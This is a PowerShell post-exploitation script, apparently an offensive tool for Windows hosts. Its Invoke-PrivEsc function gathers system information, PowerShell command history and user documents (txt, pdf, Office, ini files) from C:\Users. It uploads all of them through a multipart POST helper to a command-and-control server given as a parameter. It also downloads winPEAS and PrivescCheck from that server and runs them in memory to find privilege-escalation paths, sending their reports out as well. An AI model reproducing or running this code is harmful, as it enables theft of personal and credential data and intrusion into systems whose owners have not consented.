function Invoke-PrivEsc {
    param(
        [Parameter(Mandatory=$true)]
        [string]$C2
    )

    # ----------------------------------------
    # 1. Stealthy temp folder
    # ----------------------------------------
    $tmp = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null

    # ----------------------------------------
    # 2. Collect and POST systeminfo (for wes-ng)
    # ----------------------------------------
    $sysInfo = systeminfo | Out-String
    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null


    # ----------------------------------------
    # 3. Collect and POST PowerShell history
    # ----------------------------------------

    $histPath = $null
    $cmd = Get-Command Get-PSReadlineOption -ErrorAction SilentlyContinue
    if ($cmd) {
        try { $histPath = (Get-PSReadlineOption).HistorySavePath } catch { }
    }
    if (-not $histPath) {
        $histPath = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    }

    if ($histPath -and (Test-Path $histPath)) {
        try {
            $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue
            if ($psHist) {
                # Invoke-WebRequest -UseBasicParsing -Uri "http://$($C2):8080/g" -Method Post -Body ($psHist -join "`r`n") | Out-Null
                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
            }
        } catch { }
    }


    # ----------------------------------------
    # 4. Collect user files and POST
    # ----------------------------------------
    $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini'
    try {
        $files = Get-ChildItem -Path "C:\Users\" -Include $extensions -File -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                Invoke-FileUpload -C2 $C2 -FilePath $file | Out-Null
            } catch { }
        }
    } catch { }


    # ----------------------------------------
    # 5. Run winPEAS.exe in memory and exfiltrate output
    # ----------------------------------------
    $peasUrl = "http://$C2/winpeas.exe"
    $wp = [System.Reflection.Assembly]::Load(
        [byte[]](Invoke-WebRequest $peasUrl -UseBasicParsing | Select-Object -ExpandProperty Content)
    )

    # Redirect stdout to a StringWriter
    $sw = New-Object System.IO.StringWriter
    [Console]::SetOut($sw)

    # Execute winPEAS
    [winPEAS.Program]::Main(@(""))

    # Capture the output
    $peasOutput = $sw.ToString()

    # Restore console output
    [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))

    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "winpeas_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null

    # ----------------------------------------
    # 6. Run PrivescCheck.ps1 in-memory → POST separately
    # ----------------------------------------
    $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
    Invoke-Expression $privCheck
    $privCheckHtml = Join-Path $tmp "PrivescCheck_$($env:COMPUTERNAME)"
    $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null

    # ----------------------------------------
    # 7. Cleanup
    # ----------------------------------------
    Remove-Item $tmp -Recurse -Force
}


function Invoke-FileUpload {
    param(
        [Parameter(ParameterSetName="File", Mandatory=$true)]
        [string]$FilePath,

        [Parameter(ParameterSetName="Direct", Mandatory=$true)]
        [string]$InputString,

        [Parameter(ParameterSetName="Direct", Mandatory=$true)]
        [string]$FileName,

        [Parameter(Mandatory=$true)]
        [string]$C2
    )

    try {
        # Construct upload URL
        $Url = "http://$($C2):8080/p"
        $Boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        if ($PSCmdlet.ParameterSetName -eq "File") {
            if (-not (Test-Path $FilePath)) {
                Write-Error "File not found: $FilePath"
                return
            }
            $FileName = [System.IO.Path]::GetFileName($FilePath)
            $FileContent = Get-Content -Raw -Path $FilePath
        }
        else {
            $FileContent = $InputString
        }

        # Build multipart body manually
        $Body  = "--$Boundary$LF"
        $Body += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
        $Body += "Content-Type: text/plain$LF$LF"
        $Body += $FileContent + $LF
        $Body += "--$Boundary--$LF"

        # Send request
        Invoke-WebRequest -Uri $Url -Method Post -Body $Body -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing

        Write-Host "[*] Uploaded $FileName to $Url"
    }
    catch {
        Write-Error "Upload failed: $_"
    }
}
